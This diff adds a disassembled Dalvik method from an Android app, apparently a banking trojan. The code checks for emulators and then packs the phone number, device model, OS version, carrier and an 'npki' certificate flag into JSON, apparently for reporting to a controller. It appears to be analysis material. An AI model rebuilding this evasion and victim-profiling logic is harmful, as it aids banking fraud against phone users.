@@ -1,0 +1,81 @@
+# Lkk/service/HUOLU$5;->run()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v6
+#
+# - return:void
+
+run-BB@0x0 : [ run-BB@0x26 run-BB@0x28 ]
+	0       (00000000) const/4              v5, -1
+	1       (00000002) iget-object          v3, v6, Lkk/service/HUOLU$5;->this$0 Lkk/service/HUOLU;
+	2       (00000006) invoke-virtual       v3, Lkk/service/HUOLU;->getApplicationContext()Landroid/content/Context;
+	3       (0000000c) move-result-object   v3
+	4       (0000000e) invoke-static        v3, Lkk/util/StUtil;->getMachine(Landroid/content/Context;)Ljava/lang/String;
+	5       (00000014) move-result-object   v2
+	6       (00000016) const-string         v3, '88'
+	7       (0000001a) invoke-virtual       v3, v2, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+	8       (00000020) move-result          v3
+	9       (00000022) if-eqz               v3, +3
+
+run-BB@0x26 : 
+	10      (00000026) return-void          
+
+run-BB@0x28 : [ run-BB@0x40 ]
+	11      (00000028) const-string         v3, 'shit'
+	12      (0000002c) const-string         v4, '3'
+	13      (00000030) invoke-static        v3, v4, Landroid/util/Log;->i(Ljava/lang/String; Ljava/lang/String;)I
+	14      (00000036) new-instance         v1, Lorg/json/JSONObject;
+	15      (0000003a) invoke-direct        v1, Lorg/json/JSONObject;-><init>()V
+
+run-BB@0x40 : [ run-BB@0x72 run-BB@0x26 ]
+	16      (00000040) const-string         v3, 'mobile'
+	17      (00000044) iget-object          v4, v6, Lkk/service/HUOLU$5;->this$0 Lkk/service/HUOLU;
+	18      (00000048) invoke-virtual       v4, Lkk/service/HUOLU;->getApplicationContext()Landroid/content/Context;
+	19      (0000004e) move-result-object   v4
+	20      (00000050) invoke-static        v4, Lkk/util/StUtil;->getMachine(Landroid/content/Context;)Ljava/lang/String;
+	21      (00000056) move-result-object   v4
+	22      (00000058) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	23      (0000005e) sget-object          v3, Landroid/os/Build;->MODEL Ljava/lang/String;
+	24      (00000062) const-string         v4, 'ARM'
+	25      (00000066) invoke-virtual       v3, v4, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
+	26      (0000006c) move-result          v3
+	27      (0000006e) if-ne                v3, v5, -24
+	40:dd
+	(Lorg/json/JSONException; -> e0 run-BB@0xe0)
+
+run-BB@0x72 : [ run-BB@0x86 run-BB@0x26 ]
+	28      (00000072) sget-object          v3, Landroid/os/Build;->MODEL Ljava/lang/String;
+	29      (00000076) const-string         v4, 'SDK'
+	30      (0000007a) invoke-virtual       v3, v4, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
+	31      (00000080) move-result          v3
+	32      (00000082) if-ne                v3, v5, -2e
+	40:dd
+	(Lorg/json/JSONException; -> e0 run-BB@0xe0)
+
+run-BB@0x86 : [ run-BB@0x26 ]
+	33      (00000086) const-string         v3, 'machine'
+	34      (0000008a) sget-object          v4, Landroid/os/Build;->MODEL Ljava/lang/String;
+	35      (0000008e) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	36      (00000094) const-string         v3, 'sversion'
+	37      (00000098) sget-object          v4, Landroid/os/Build$VERSION;->RELEASE Ljava/lang/String;
+	38      (0000009c) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	39      (000000a2) const-string         v3, 'bank'
+	40      (000000a6) const-string         v4, ''
+	41      (000000aa) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	42      (000000b0) const-string         v3, 'provider'
+	43      (000000b4) iget-object          v4, v6, Lkk/service/HUOLU$5;->this$0 Lkk/service/HUOLU;
+	44      (000000b8) invoke-static        v4, Lkk/util/NetUtil;->getProvidersName(Landroid/content/Context;)Ljava/lang/String;
+	45      (000000be) move-result-object   v4
+	46      (000000c0) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	47      (000000c6) const-string         v3, 'npki'
+	48      (000000ca) const-string         v4, '1'
+	49      (000000ce) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	50      (000000d4) iget-object          v3, v6, Lkk/service/HUOLU$5;->this$0 Lkk/service/HUOLU;
+	51      (000000d8) invoke-virtual       v3, v1, Lkk/service/HUOLU;->ff(Lorg/json/JSONObject;)V
+	52      (000000de) goto                 -5c
+
+run-BB@0xe0 : [ run-BB@0x26 ]
+	53      (000000e0) move-exception       v0
+	54      (000000e2) invoke-virtual       v0, Lorg/json/JSONException;->printStackTrace()V
+	55      (000000e8) goto                 -61
+
